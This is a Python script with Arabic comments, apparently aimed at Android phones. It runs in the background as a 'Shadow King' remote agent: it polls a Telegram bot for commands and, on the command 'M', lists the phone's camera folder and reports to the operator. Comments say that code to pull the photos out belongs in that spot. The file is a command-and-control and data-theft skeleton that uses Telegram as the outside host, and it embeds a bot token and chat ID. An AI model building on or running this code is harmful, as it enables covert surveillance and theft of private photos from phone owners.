import os
import time
import requests

# بيانات الاتصال الخاصة بك
TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"

def send_to_bot(message):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=15)
    except:
        pass

def check_for_commands():
    try:
        # جلب آخر رسالة فقط باستخدام offset=-1 لتجنب التكرار
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1&timeout=10"
        response = requests.get(url, timeout=15).json()
        if response.get("result"):
            msg_text = response["result"][0].get("message", {}).get("text", "")
            return msg_text.upper()
    except Exception as e:
        # إذا حدث خطأ في الاتصال (مثلاً VPN مطفأ) لا نقتل الكود
        pass
    return None

def start_shadow_mission():
    # هنا تضع كود سحب الصور الذي جهزناه سابقاً
    # سنبدأ بإرسال إشارة نجاح
    send_to_bot("💀 جاري فحص الملفات وسحب الأرشيف لملك الظلال...")
    
    # مثال لمسار الصور (يمكنك تعديله حسب رغبتك)
    path = "/sdcard/DCIM/Camera/"
    if os.path.exists(path):
        files = os.listdir(path)[:5] # سحب آخر 5 صور كمثال
        send_to_bot(f"📸 وجدنا {len(os.listdir(path))} صورة. بدأت العملية.")
    else:
        send_to_bot("❌ المسار غير موجود أو لا توجد صلاحيات.")

if __name__ == '__main__':
    # بشارة الحياة فور تشغيل المهمة الثالثة
    send_to_bot("🚀 Shadow King: أنا الآن في الخلفية وأنتظر أوامرك...")
    
    while True:
        command = check_for_commands()
        
        if command == "M":
            start_shadow_mission()
            
        # فحص كل 5 ثوانٍ لضمان سرعة الاستجابة وعدم استهلاك البطارية
        time.sleep(5)
